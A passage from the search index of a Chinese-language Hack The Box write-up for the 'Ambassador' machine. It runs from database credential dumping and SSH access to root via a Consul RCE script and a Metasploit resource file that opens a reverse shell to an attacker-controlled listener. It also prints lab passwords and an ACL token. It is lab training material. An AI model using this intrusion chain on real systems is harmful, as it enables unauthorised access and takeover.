table_info(user);\n0|id|INTEGER|1||1\n1|version|INTEGER|1||0\n2|login|TEXT|1||0\n3|email|TEXT|1||0\n4|name|TEXT|0||0\n5|password|TEXT|0||0\n6|salt|TEXT|0||0\n7|rands|TEXT|0||0\n8|company|TEXT|0||0\n9|org_id|INTEGER|1||0\n10|is_admin|INTEGER|1||0\n11|email_verified|INTEGER|0||0\n12|theme|TEXT|0||0\n13|created|DATETIME|1||0\n14|updated|DATETIME|1||0\n15|help_flags1|INTEGER|1|0|0\n16|last_seen_at|DATETIME|0||0\n17|is_disabled|INTEGER|1|0|0\n</code></pre></p> <p>\u5bf9\u7167\u7740\u6570\u636e\u770b\u4e86\u4e00\u4e0b\uff0c\u539f\u6765 <code>|dontStandSoCloseToMe63221!|grafana|</code> \u5c31\u662f\u8d26\u6237\u5bc6\u7801\u554a\uff01 \u4ee5\u53ca\u521a\u521a\u770bConfiguration\u83dc\u5355\u91ccData source\u91cc\u9762\u4e5f\u662f <code>mysql</code>\uff0c\u83ab\u975e\u8fd9\u662f\u8fde\u63a5MySQL\u7684\u8d26\u6237\u5bc6\u7801\uff1f\u6bd5\u7adf\u6211\u4eec\u6700\u5f00\u59cb\u6709\u626b\u63cf\u52303306\u3002 \u65e2\u7136\u73b0\u5728\u6709\u5bc6\u7801\u4e86\u90a3\u5c31\u8bd5\u8bd5\u80fd\u4e0d\u80fd\u8f6c\u79fb\u6218\u573a\u5427\u3002</p>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#3306-mysql","title":"3306\u7aef\u53e3: MySQL","text":"<p>\u7528\u521a\u521a\u6536\u96c6\u7684\u4fe1\u606f\u6210\u529f\u8fde\u63a5~ <pre><code>$ mysql -u grafana -h 10.10.11.183 -p                                \nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 15\nServer version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMySQL [(none)]&gt; \\h\n</code></pre></p> <p>\u867d\u7136\u4e0d\u662f\u5f88\u61c2\u4e3a\u4ec0\u4e48\u4e00\u4e0b\u8bf4 <code>MariaDB</code> \u4e00\u4e0b\u8bf4 <code>MySQL</code>\u7684\u2026\u2026</p>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#db","title":"\u63a2\u7d22DB\u4fe1\u606f","text":"<p>\u5148\u770b\u90fd\u6709\u4ec0\u4e48DB\uff1a <pre><code>MySQL [(none)]&gt; show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| grafana            |\n| information_schema |\n| mysql              |\n| performance_schema |\n| sys                |\n| whackywidget       |\n+--------------------+\n</code></pre></p> <p>\u540d\u4e3a <code>grafana</code> \u7684DB\u662f\u7a7a\u7684\u3002  </p>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#dbmysql","title":"DB\uff1amysql","text":"<pre><code>MySQL [grafana]&gt; use mysql\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMySQL [mysql]&gt; show tables;\n+------------------------------------------------------+\n| Tables_in_mysql                                      |\n+------------------------------------------------------+\n\n...\n\n| user                                                 |\n+------------------------------------------------------+\n\nMySQL [mysql]&gt; select * from user;\n| Host      | User             | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin                | authentication_string                                                  | password_expired | password_last_changed | password_lifetime | account_locked | Create_role_priv | Drop_role_priv | Password_reuse_history | Password_reuse_time | Password_require_current | User_attributes |\n+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+------------------------------------------------------------------------+------------------+-----------------------+-------------------+----------------+------------------+----------------+------------------------+---------------------+--------------------------+-----------------+\n| %         | grafana          | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | caching_sha2_password | $A$005$W&gt;c%;m{)[j}1&amp;fNZnOExr5pLrZWaAHASAHj8aNg26tbuTaWzyKysghUuC | N                | 2022-09-02 00:55:10   |              NULL | N              | Y                | Y              |                   NULL |                NULL | NULL                     | NULL            |\n| localhost | debian-sys-maint | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | caching_sha2_password | $A$005$\u2592TXp.\nSRS%8~Y`*D[dMtygnlqNDhfnltnl0j/y4bhzs8qHSzej/FzdxfdR9D | N                | 2022-03-13 22:27:09   |              NULL | N              | Y                | Y              |                   NULL |                NULL | NULL                     | NULL            |\n| localhost | mysql.infoschema | Y           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | caching_sha2_password | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED | N                | 2022-03-13 22:27:08   |              NULL | Y              | N                | N              |                   NULL |                NULL | NULL                     | NULL            |\n| localhost | mysql.session    | N           | N           | N           | N           | N           | N         | N           | Y             | N            | N         | N          | N               | N          | N          | N            | Y          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | caching_sha2_password | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED | N                | 2022-03-13 22:27:07   |              NULL | Y              | N                | N              |                   NULL |                NULL | NULL                     | NULL            |\n| localhost | mysql.sys        | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | caching_sha2_password | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED | N                | 2022-03-13 22:27:08   |              NULL | Y              | N                | N              |                   NULL |                NULL | NULL                     | NULL            |\n| localhost | root             | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | auth_socket           |                                                                        | N                | 2022-03-13 22:27:06   |              NULL | N              | Y                | Y              |                   NULL |                NULL | NULL                     | NULL            |\n</code></pre> <p>\u8fd9\u4e2a\u663e\u793a\u592a\u4e71\u4e86\u2026\u2026\u4e0d\u8fc7\u9690\u7ea6\u80fd\u770b\u5230\u51e0\u4e2a\u8d26\u53f7\u548c\u5bc6\u7801\uff0c\u5176\u4e2d\u6709root\u3002 \u59d1\u4e14\u4e3a\u4e86\u8ba9\u8fd9\u4e2a\u8868\u5c55\u793a\u5f97\u597d\u770b\u4e9b\uff0c\u628a\u4e0a\u9762\u7684\u52a0\u53f7\u66ff\u6362\u6210 <code>|</code>\uff0c\u7136\u540e\u53e6\u5b58\u4e3amd\u6587\u4ef6\u5373\u53ef\u7528markdown\u7684\u8868\u6765\u663e\u793a\uff08\u91cc\u9762\u6709\u4e2a\u6362\u884c\uff0c\u8c03\u6574\u4e00\u4e0b\u5c31\u884c\uff09\u3002</p> <p>\u6574\u7406\u5b8c\u540e\u53d1\u73b0\uff0croot\u7684\u5bc6\u7801\u6ca1\u6709\u5199\uff1b\u67093\u4e2amysql\u76f8\u5173\u7684\u8d26\u53f7\u5176\u5bc6\u7801\u7c7b\u4f3c\u5360\u4f4d\uff0c3\u4e2a\u90fd\u4e00\u6837\uff1b\u518d\u9664\u5f001\u4e2a\u5bc6\u7801\u91cc\u9762\u5305\u542b\u4e86\u83ab\u540d\u5176\u5999\u7684 <code>\u2592</code>\uff0c\u4e0d\u77e5\u662f\u4e71\u7801\u8fd8\u662f\u6545\u610f\u6253\u7801\u3002 \u5176\u5b9e\u5c31\u53ea\u6709grafana\u8d26\u6237\u6709\u70b9\u5229\u7528\u4ef7\u503c\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u4f1a\u662f\u4ec0\u4e48\u5bc6\u7801\u3002ssh\u5e94\u8be5\u4e0d\u53ef\u80fd\uff0c\u56e0\u4e3a\u4e4b\u524d\u770b <code>/etc/passwd</code> \u91ccgrafana\u8d26\u6237\u662f\u7981\u6b62\u767b\u9646\u7684\u3002  </p> <p>\u6682\u65f6\u8bb0\u5f55\u4e0b\u6765\uff0c\u770b\u770b\u5176\u4ed6DB\u5427\u3002  </p> <p>grafana:x:113:118::/usr/share/grafana:/bin/false authentication_string: $A$005$W&gt;c%;m{)[j}1&amp;fNZnOExr5pLrZWaAHASAHj8aNg26tbuTaWzyKysghUuC</p>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#dbwhackywidget","title":"DB\uff1awhackywidget","text":"<p>\u672c\u6765\u4ee5\u4e3a\u8fd9\u4e2aDB\u6ca1\u7528\u7684\uff08\u56e0\u4e3a\u540d\u5b57\u6709\u70b9\u610f\u5473\u4e0d\u660e\uff09\uff0c\u7adf\u7136\u53d1\u73b0\u4e86\u6709\u8da3\u7684\u4e1c\u897f: <pre><code>MySQL [mysql]&gt; use whackywidget \nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMySQL [whackywidget]&gt; show tables;\n+------------------------+\n| Tables_in_whackywidget |\n+------------------------+\n| users                  |\n+------------------------+\n1 row in set (0.088 sec)\n\nMySQL [whackywidget]&gt; select * from users\n    -&gt; ;\n+-----------+------------------------------------------+\n| user      | pass                                     |\n+-----------+------------------------------------------+\n| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |\n+-----------+------------------------------------------+\n1 row in set (0.087 sec)\n</code></pre></p> <p>developer\u7528\u6237\uff0c\u770b\u4e86\u773c <code>/etc/passwd</code> \u91cc\u9762\u662f\u6709\u7684\uff0c\u4f30\u8ba1\u4e0b\u4e00\u6b65\u5e94\u8be5\u662fSSH\u8fde\u63a5\u4e86\u3002  </p> <ul> <li>\u5bc6\u7801base64\u89e3\u5bc6\uff1aanEnglishManInNewYork027468</li> </ul>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#initial-access","title":"Initial Access","text":"<pre><code>$ ssh developer@10.10.11.183                   \ndeveloper@10.10.11.183's password: \nWelcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sun 25 Dec 2022 07:11:23 AM UTC\n\n  System load:           0.0\n  Usage of /:            80.9% of 5.07GB\n  Memory usage:          39%\n  Swap usage:            0%\n  Processes:             229\n  Users logged in:       0\n  IPv4 address for eth0: 10.10.11.183\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:cd51\n\n\n0 updates can be applied immediately.\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nLast login: Fri Sep  2 02:33:30 2022 from 10.10.0.1\ndeveloper@ambassador:~$ ls\nsnap  user.txt\n</code></pre>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#flag-user","title":"flag: user","text":"<pre><code>developer@ambassador:~$ cat user.txt \n295c\u2026\u2026\u2026\u202622d948\n</code></pre>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#privilege-escalation","title":"Privilege Escalation","text":"<p>\u60ef\u4f8b\u6536\u96c6\u51e0\u4e2a\u57fa\u7840\u4fe1\u606f\uff1a  </p> <ul> <li>sudo\uff1a\u65e0sudo\u6267\u884c\u6743\u9650</li> <li> <p>SUID\uff1a\u9664\u53bb/snap/\u91cc\u7684\u5269\u8fd9\u4e9b\uff0c\u7c97\u7565\u770b\u4e86\u51e0\u4e2a\u77ed\u7684\u547d\u4ee4\u4e0d\u50cf\u662f\u80fd\u5229\u7528\u7684  </p> <pre><code>developer@ambassador:~$ find / -perm -4000 -exec ls -l {} \\; 2&gt;/dev/null\n-rwsr-xr-x 1 root root 142792 May 11  2022 /usr/lib/snapd/snap-confine\n-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device\n-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1\n-rwsr-xr-x 1 root root 473576 Mar 30  2022 /usr/lib/openssh/ssh-keysign\n-rwsr-xr-- 1 root messagebus 51344 Apr 29  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n-rwsr-xr-x 1 root root 39144 Feb  7  2022 /usr/bin/umount\n-rwsr-xr-x 1 root root 53040 Mar 14  2022 /usr/bin/chsh\n-rwsr-xr-x 1 root root 88464 Mar 14  2022 /usr/bin/gpasswd\n-rwsr-xr-x 1 root root 85064 Mar 14  2022 /usr/bin/chfn\n-rwsr-xr-x 1 root root 67816 Feb  7  2022 /usr/bin/su\n-rwsr-xr-x 1 root root 44784 Mar 14  2022 /usr/bin/newgrp\n-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at\n-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo\n-rwsr-xr-x 1 root root 55528 Feb  7  2022 /usr/bin/mount\n-rwsr-xr-x 1 root root 68208 Mar 14  2022 /usr/bin/passwd\n-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount\n</code></pre> </li> <li> <p>\u7528\u6237\u5bb6\u76ee\u5f55\uff1a\u6709 <code>.gitconfig</code> \u6587\u4ef6\u3002</p> </li> </ul>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#git","title":"\u63a2\u7d22git","text":"<p>\u6839\u636e <code>.gitconfig</code> \u6587\u4ef6\uff0c\u6211\u4eec\u53bb\u5230 <code>/opt/my-app/</code>\uff0c\u5148\u770b\u4e00\u773c\u786e\u5b9e\u6709 <code>.git</code> \u6587\u4ef6\u5939\u3002\u90a3\u4e48\u770b\u4e00\u773cgit\u5386\u53f2\uff1a \u81f3\u4e8e\u4e3a\u4ec0\u4e48\u4f1a\u60f3\u5230\u68c0\u67e5git\uff0c\u5927\u6982\u56e0\u4e3a\u524d\u4e0d\u4e45\u73a9\u4e86\u4e00\u4e0bChallenges\u7684Illumination\u5427 <pre><code>developer@ambassador:/opt/my-app$ git log\ncommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)\nAuthor: Developer &lt;developer@ambassador.local&gt;\nDate:   Sun Mar 13 23:47:36 2022 +0000\n\n    tidy config script\n\ncommit c982db8eff6f10f8f3a7d802f79f2705e7a21b55\nAuthor: Developer &lt;developer@ambassador.local&gt;\nDate:   Sun Mar 13 23:44:45 2022 +0000\n\n    config script\n\ncommit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6\nAuthor: Developer &lt;developer@ambassador.local&gt;\nDate:   Sun Mar 13 22:47:01 2022 +0000\n\n    created project with django CLI\n\ncommit 4b8597b167b2fbf8ec35f992224e612bf28d9e51\nAuthor: Developer &lt;developer@ambassador.local&gt;\nDate:   Sun Mar 13 22:44:11 2022 +0000\n\n    .gitignore\n</code></pre></p> <p>\u8ddfdjango\u6709\u4ec0\u4e48\u5173\u7cfb\u4f3c\u7684\uff0c\u770b\u4e86\u4e0b\u7248\u672c\uff0c\u7136\u540e\u6709\u4e00\u4e32\u5bc6\u7801\u7684\u6837\u5b50\u3002  </p> <pre><code>developer@ambassador:/opt/my-app/whackywidget$ cat whackywidget/settings.py\n\nGenerated by 'django-admin startproject' using Django 4.0.3.\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = 'django-insecure--lqw3fdyxw(28h#0(w8_te*wm*6ppl@g!ttcpo^m-ig!qtqy!l'\n</code></pre> <p>\u4f46\u662f\u8bd5\u7740\u542f\u52a8\u4e86\u4e00\u4e0bdjango\u53c8\u4f1a\u62a5\u9519\u597d\u50cf\u6ca1\u6709django\u73af\u5883\uff0c\u672c\u6765\u4ee5\u4e3a\u662f\u9700\u8981\u865a\u62df\u73af\u5883\uff08\u56e0\u4e3a\u6709\u4e2a <code>env/pyvenv.cfg</code>\uff09\uff0c\u4e0d\u8fc7\u8fdb\u865a\u62df\u73af\u5883\u4e5f\u65e0\u6cd5\u542f\u52a8django\u3002\u5927\u6982\u4e0d\u662f\u8fd9\u4e2a\u601d\u8def\u5427\u3002</p> <p>\u7ee7\u7eed\u770bgit\u5386\u53f2\uff1a <pre><code>developer@ambassador:/opt/my-app$ git show\ncommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)\nAuthor: Developer &lt;developer@ambassador.local&gt;\nDate:   Sun Mar 13 23:47:36 2022 +0000\n\n    tidy config script\n\ndiff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh\nindex 35c08f6..fc51ec0 100755\n--- a/whackywidget/put-config-in-consul.sh\n+++ b/whackywidget/put-config-in-consul.sh\n@@ -1,4 +1,4 @@\n # We use Consul for application config in production, this script will help set the correct values for the app\n-# Export MYSQL_PASSWORD before running\n+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running\n\n-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD\n+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD\n</code></pre></p> <p>\u8fd9\u4e2ashell\u811a\u672c\u73b0\u5728\u8fd0\u884c\u4f1a\u62a5\u9519\uff0c\u4e0d\u8fc7\u91cc\u9762\u5c31\u662f\u6267\u884c\u4e86\u4e00\u6761\u547d\u4ee4\uff0c\u770bgit\u63d0\u4ea4\u5386\u53f2\u672c\u6765\u6709\u4e00\u4e32token\u3002 \u786e\u8ba4\u4e86\u4e00\u4e0b\u8fd9\u4e2a\u547d\u4ee4\u8fd8\u5728\uff1a <pre><code>developer@ambassador:~$ which consul\n/usr/bin/consul\n</code></pre></p> <p>\u641c\u4e86\u641cconsul\uff0c\u4f3c\u4e4e\u662f\u4e2a\u90e8\u7f72/\u914d\u7f6e\u670d\u52a1\u7684\u5de5\u5177\uff1f  </p>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#poc","title":"PoC","text":"<p>\u60ef\u4f8b\u8c37\u6b4c\u4e00\u6ce2 <code>consul exploit</code> \u770b\u770b\u6709\u4ec0\u4e48\u3002 \u53d1\u73b0\u8fd9\u4e2a\u5229\u7528\u811a\u672c\uff0c\u4e0d\u8fc7\u8bd5\u4e86\u4e0b\u4e0d\u592a\u884c\u3002\uff08\u540e\u6765\u53cd\u5e94\u8fc7\u6765\u8fd9\u4e2a\u811a\u672c\u91cc\u9762\u90fd\u6ca1\u6709\u7528\u5230 <code>token</code> \u2026\u2026\uff09</p> <p>\u63a5\u7740\u770b\u5230\u8fd9\u51e0\u7bc7\u6587\u7ae0\uff0c\u90fd\u662f\u8bf4metasploit\u7684\u6837\u5b50\u3002 \u4e4b\u524d\u8fd8\u4ee5\u4e3aHTB\u7684\u9776\u673a\u90fd\u662f\u624b\u52a8\uff0c\u6ca1\u60f3\u7740\u8981\u7528metasploit\u6765\u7740\u3002\u5148\u653e\u7740\u770b\u770b\u5176\u4ed6\u3002\uff08\u5176\u5b9e\u8bd5\u4e86\u4e00\u4e0b\u4e0d\u8fc7\u5931\u8d25\u4e86\uff0c\u611f\u89c9\u662f\u8981\u7aef\u53e3\u8f6c\u53d1\u3002\u8be6\u89c1\u4e0b\u6587\u65b9\u6cd5\u4e8c\uff09</p> <p>https://blog.pentesteracademy.com/hashicorp-consul-remote-command-execution-via-services-api-d709f8ac3960 https://www.exploit-db.com/exploits/46074 https://www.rapid7.com/db/modules/exploit/multi/misc/consul_service_exec</p> <p>\u7136\u540e\u8fd9\u7bc7\u6587\u7ae0\uff0c\u5927\u81f4\u4e0a\u77e5\u9053\u8fd9\u4e2a\u547d\u4ee4\u80fd\u901a\u8fc7API\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002</p> <p>https://lab.wallarm.com/consul-by-hashicorp-from-infoleak-to-rce</p>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#flag-root","title":"flag: root","text":"","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#githubexp","title":"\u65b9\u6cd5\u4e00\uff1aGithub\u4e0a\u7684exp\u811a\u672c","text":"<p>\u5728Github\u4e0a\u540c\u6837\u641c\u641c <code>consul exploit</code>\uff0c\u80fd\u53d1\u73b0\u8fd9\u4e2a\uff1a  </p> <p>https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API </p> <p>\u5c06\u811a\u672c\u4f20\u5230\u76ee\u6807\u673a\u5668\uff0c\u6309\u7167\u8bf4\u660e\u6267\u884c\u5373\u53ef\u83b7\u5f97root\u7684\u53cd\u5f39shell\u3002</p> <pre><code>root@ambassador:/# cat /root/root.txt\ncat /root/root.txt\nd5f3\u2026\u2026\u2026\u2026efdf\n</code></pre>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#metasploit","title":"\u65b9\u6cd5\u4e8c\uff1ametasploit+\u7aef\u53e3\u8f6c\u53d1","text":"<p>\u8865\u5145\u4e00\u4e0b\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u56e0\u4e3a\u8fd8\u633a\u597d\u5947metasploit\u65b9\u5f0f\u4e4b\u524d\u4e3a\u4ec0\u4e48\u5931\u8d25\u4e86\u3002  </p> <p>\u5176\u5b9e\u5728\u62ffroot shell\u9636\u6bb5\u65f6\uff0c\u4e00\u5f00\u59cb\u6ca1\u60f3\u5230\u8981\u5728Github\u4e0a\u641c\uff0c\u8c37\u6b4c\u4e0a\u7ffb\u627e\u534a\u5929\u6ca1\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u7684\u3002\u4e8e\u662f\u59d1\u4e14\u4e5f\u5c1d\u8bd5\u8fc7metasploit\uff0c\u4e0d\u8fc7\u5931\u8d25\u4e86\u3002\u60f3\u4e86\u4e00\u4e0b\u4f30\u8ba1\u662f\u8981\u5f04\u4e2a\u7aef\u53e3\u8f6c\u53d1\uff08\u56e0\u4e3a\u662f\u5c06payload\u53d1\u9001\u5230\u76ee\u6807\u673a\u7684127.0.0.1:8500\uff09\uff0c\u4e0d\u8fc7\u6211\u5bf9\u7aef\u53e3\u8f6c\u53d1\u4e5f\u53ea\u662f\u6709\u4e2a\u5927\u81f4\u7684\u6982\u5ff5\uff0c\u8fd8\u6ca1\u5b9e\u9645\u5c1d\u8bd5\u8fc7\u3002\u6240\u4ee5\u5f53\u65f6\u5c31\u6682\u65f6\u653e\u5f03\u4e86\uff0c\u9009\u62e9\u7ee7\u7eed\u53bb\u5bfb\u627eexp\u3002\uff08\u4e3b\u8981\u662f\u60f3\u5feb\u70b9\u62ffflag\uff09  </p> <p>\u73b0\u5728\u65e2\u7136\u8fd9\u53f0\u9776\u673a\u5df2\u7ecf\u62ff\u4e0b\uff0c\u5c31\u6253\u7b97\u5b9e\u8df5\u4e00\u4e0b\u7aef\u53e3\u8f6c\u53d1\u3002</p> <p>\u9996\u5148\uff0c\u5efa\u7acbSSH\u96a7\u9053\uff08\u5bf9\u6bd4\u6267\u884c\u7aef\u53e3\u8f6c\u53d1\u524d\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u672c\u5730\u591a\u4e86\u4e2a8500\u7aef\u53e3\u7684\u76d1\u542c\uff09\uff1a <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ssh -v -L 8500:127.0.0.1:8500 developer@10.10.11.183\n\n---\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ netstat -tnoa | grep \":8500\"\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ netstat -tnoa | grep \":8500\"\ntcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp6       0      0 ::1:8500                :::*                    LISTEN      off (0.00/0/0)\n</code></pre></p> <p>\u7136\u540e\u65b0\u5efa\u6587\u672c\uff08msf.txt\uff09\u5199\u5165\u4e0b\u9762\u547d\u4ee4\uff1a <pre><code>use exploit/multi/misc/consul_service_exec\nset rhosts 127.0.0.1\nset lhost &lt;your attack machine IP&gt;\nset lport 4455\nset ACL_TOKEN bb03b43b-1d81-d62b-24b5-39540ee469b5\nrun\n</code></pre></p> <p>\u6700\u540e\uff0c\u8fd0\u884cmsf\u6267\u884c\u4e0a\u8ff0\u547d\u4ee4\uff08msf\u4f1a\u81ea\u5df1\u5f00\u542f\u76d1\u542c\uff0c\u6240\u4ee5\u4e0d\u9700\u53e6\u5916\u7528 <code>nc</code> \u5f00\u542f\u76d1\u542c\uff0c\u5426\u5219msf\u4f1a\u62a5\u9519\u8bf4\u7aef\u53e3\u5df2\u88ab\u5360\u7528\uff09\uff1a <pre><code>msfconsole -r msf.txt\n</code></pre></p> <p>exploit\u6210\u529f\uff0c\u7adf\u7136\u662f\u83b7\u5f97Meterpreter\u554a\uff0c\u8fd8\u4ee5\u4e3a\u4f1a\u662fbash\u4ec0\u4e48\u7684\u3002</p> <pre><code>meterpreter &gt; getuid\nServer username: root\nmeterpreter &gt; pwd\n/\nmeterpreter &gt; cat /root/root.txt\nd5f3\u2026\u2026\u2026\u2026efdf\n</code></pre> <p>\u987a\u4fbf\uff0c\u7531\u4e8eSSH\u96a7\u9053\u7528\u4e86 <code>-v</code> \u9009\u9879\uff0c\u76ee\u6807\u673a\u4f1a\u6709\u8fd9\u4e9blog\uff1a <pre><code>developer@ambassador:~$ debug1: Connection to port 8500 forwarding to 127.0.0.1 port 8500 requested.\ndebug1: channel 3: new [direct-tcpip]\ndebug1: channel 3: free: direct-tcpip: listening port 8500 for 127.0.0.1 port 8500, connect from 127.0.0.1 port 36675 to 127.0.0.1 port 8500, nchannels 4\ndebug1: Connection to port 8500 forwarding to 127.0.0.1 port 8500 requested.\ndebug1: channel 3: new [direct-tcpip]\ndebug1: channel 3: free: direct-tcpip: listening port 8500 for 127.0.0.1 port 8500, connect from 127.0.0.1 port 40919 to 127.0.0.1 port 8500, nchannels 4\n</code></pre></p> <p>\u4ee5\u4e0a\u3002</p>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#_3","title":"\u540e\u8bb0","text":"<p>2022/12/25 \u7adf\u7136\u5728\u5e74\u5185\u6253\u5b8c\u8fd9\u53f0\u5566\uff0c\u4e0d\u6127\u662fMedium\u91cc\u7528\u6237\u8bc4\u5206\u6700\u7b80\u5355\u7684\u4e00\u53f0www \u4e5f\u7b97\u662f\u8d76\u4e0a\u4e86\u597d\u65f6\u5019\uff0c\u4e00\u76f4\u90fd\u662f\u53ea\u6562\u73a9\u73a9THM\uff0c\uff08\u5927\u6982\u4e00\u5e74\u524d\u5de6\u53f3\u521a\u5165\u95e8\u65f6\u73a9\u4e86\u4e00\u4e0bHTB\u5b8c\u5168\u4e0d\u61c2\u4e25\u91cd\u53d7\u632b\u4e8e\u662f\u6ca1\u60f3\u7740\u81ea\u5df1\u80fd\u6253HTB\u2026\u2026\uff0912\u6708\u521d\u56e0\u4e3a\u5404\u79cd\u5951\u673a\uff0c\u5f00\u59cb\u7422\u78e8\u7740\u6361\u8d77\u53f7\u73a9\u73a9HTB\u65f6\u770b\u5230\u6709\u8fd9\u53f0\u4f3c\u4e4e\u8f83\u7b80\u5355\u7684Medium\uff0c\u53c8\u770b\u4e86\u4e0bRank\u7684\u8ba1\u7b97\u5c31\u662f\u62536\u53f0\u5347\u5230Hacker\u3002\u4e8e\u662f12\u6708\u6709\u7a7a\u5c31\u6253\u9776\uff0c\u529f\u592b\u4e0d\u8d1f\u6709\u5fc3\u4eba\u5427\uff01</p> <p>\u4e5f\u8be5\u51c6\u5907\u51c6\u5907\u590d\u4e60CEH\u4e86\u3002\u7b49\u8003\u5b8c\u7ee7\u7eed\u6109\u5feb\u6253\u9776~</p> <p>2022/01/10 \u8865\u5145\u4e86\u4e00\u4e0b\u65b9\u6cd5\u4e8c\uff08metasploit+\u7aef\u53e3\u8f6c\u53d1\uff09\u3002 